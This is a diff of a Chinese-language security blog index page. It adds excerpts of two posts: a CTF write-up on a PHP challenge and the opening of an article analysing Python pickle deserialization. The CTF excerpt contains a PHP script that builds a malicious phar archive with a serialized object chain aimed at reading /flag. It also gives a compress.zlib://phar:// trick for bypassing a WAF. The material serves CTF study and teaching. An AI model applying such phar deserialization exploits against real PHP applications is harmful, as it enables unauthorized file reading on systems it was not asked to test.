@@ -160,6 +160,168 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-极客巅峰" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/09/27/极客巅峰/">极客巅峰+月饼赛</a>
+    </h1>
+  
+
+        
+        <a href="/2020/09/27/极客巅峰/" class="archive-article-date">
+  	<time datetime="2020-09-26T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-27</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="BABYPHP2"><a href="#BABYPHP2" class="headerlink" title="BABYPHP2"></a>BABYPHP2</h1><p><a href="http://www.zip源码泄露，审查源码发现文件上传和读取，可以构造phar反序列化。" target="_blank" rel="noopener">www.zip源码泄露，审查源码发现文件上传和读取，可以构造phar反序列化。</a></p>
+<p>链子还是比较简单的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $backup;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;nickname=<span class="keyword">new</span> Reader();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;backup=<span class="string">"/flag"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;backup=<span class="keyword">$this</span>-&gt;backup;</span><br><span class="line">        $user = <span class="keyword">new</span> User();</span><br><span class="line">        $user-&gt;id = $_SESSION[<span class="string">'id'</span>];</span><br><span class="line">        $user-&gt;nickname = $_SESSION[<span class="string">'token'</span>];</span><br><span class="line">        <span class="keyword">return</span> serialize($user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=<span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Reader</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头用以欺骗检测</span></span><br><span class="line">$phar-&gt;setMetadata($a); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+
+<p>使用compress.zlib://phar:// 绕过WAF，读取flag。</p>
+        
+          <a class="article-more-a" href="/2020/09/27/极客巅峰/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/专题-writeup//" class="article-tag-list-link color2">专题  writeup</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/09/27/极客巅峰/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Pickle反序列化" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/09/21/Pickle反序列化/">Pickle反序列化</a>
+    </h1>
+  
+
+        
+        <a href="/2020/09/21/Pickle反序列化/" class="archive-article-date">
+  	<time datetime="2020-09-20T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-21</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Pickle反序列化的分析与利用"><a href="#Pickle反序列化的分析与利用" class="headerlink" title="Pickle反序列化的分析与利用"></a>Pickle反序列化的分析与利用</h1><p>本文首发于先知<a href="https://xz.aliyun.com/t/8342" target="_blank" rel="noopener">https://xz.aliyun.com/t/8342</a></p>
+<h2 id="反序列化过程分析"><a href="#反序列化过程分析" class="headerlink" title="反序列化过程分析"></a>反序列化过程分析</h2><p>pickle.dump()方法可以将对象序列化。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">class animal:</span><br><span class="line">    def __init__(self,animal):</span><br><span class="line">        self.animal=animal</span><br><span class="line">        </span><br><span class="line">test=pickle.dumps(animal(&quot;dog&quot;))</span><br><span class="line">print(test)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&apos;\x80\x03c__main__\nanimal\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.&apos;</span><br></pre></td></tr></table></figure>
+
+<p>使用pickle.loads()方法反序列化字符串，查看一下loads方法的源码。</p>
+        
+          <a class="article-more-a" href="/2020/09/21/Pickle反序列化/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/专题-Python//" class="article-tag-list-link color1">专题  Python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/09/21/Pickle反序列化/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-XXE专题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -586,7 +748,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2021 Ycj
+    		&copy; 2022 Ycj
     		<span id="busuanzi_container_site_pv">    本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
     	</div>
       	<div class="footer-right">
